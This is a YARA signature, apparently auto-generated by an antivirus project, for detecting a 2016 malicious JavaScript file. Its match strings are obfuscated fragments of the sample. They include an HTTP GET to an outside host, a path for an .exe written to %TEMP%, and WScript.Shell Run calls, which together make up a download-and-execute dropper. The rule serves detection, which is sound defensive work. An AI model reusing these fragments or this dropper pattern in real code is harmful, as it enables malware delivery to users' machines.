rule sig_20160401_ee355af5f5ed4405b2c15044048097ef {
  meta:
    description = "datamaliciousorder - file 20160401_ee355af5f5ed4405b2c15044048097ef.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "050fb84b1a3c1fb598efe732523d0d866bdd176eefbbdbb4f71b2c3357f9f4c3"

  strings:
    $s1  = "function JrdQp(FaaEi, YlCp){RvoIcv = RvoIcv * 1; return FaaEi - YlCp;};" fullword ascii
    $s2  = "FyZql[EwLtn](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s3  = "if (FyZql[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function ZiWz() {return AabTyc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"l3JXsxhNgpS7MO.ex\" + \"e\";};" fullword ascii
    $s5  = "var AabTyc = function OocAgq() {return WScript[TygOc](\"WScript\"+\".Shell\");}(), YjwEst = 11;" fullword ascii
    $s6  = "function KutQwj(){return YqIm + \"\";};" fullword ascii
    $s7  = "function DhXa() {return ((JzIoc == true) && (JzIoc == VbCbl)) ? 1 : RvoIcv;};" fullword ascii
    $s8  = "function VbHz(VmxMga) {var UwRnc = (1, 2, 3, 4, 5, VmxMga); return UwRnc;};" fullword ascii
    $s9  = "JzIoc = true; " fullword ascii
    $s10 = "VbCbl = true; " fullword ascii
    $s11 = "var UpJow = new this[\"Date\"]();" fullword ascii
    $s12 = "var SnDm = false;" fullword ascii
    $s13 = "return JrdQp(ZeYl, OltBch);" fullword ascii
    $s14 = "function RouFa(NnCkr){AabTyc[\"R\"+\"un\"](NnCkr, RvoIcv, RvoIcv);};" fullword ascii
    $s15 = "}while (FoqDdw);" fullword ascii
    $s16 = "var JzIoc = false;" fullword ascii
    $s17 = "function XoLz(){return TygOc;};" fullword ascii
    $s18 = "function GjGjm()" fullword ascii
    $s19 = "function CqoTr(){return 23;};" fullword ascii
    $s20 = "var VbCbl = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}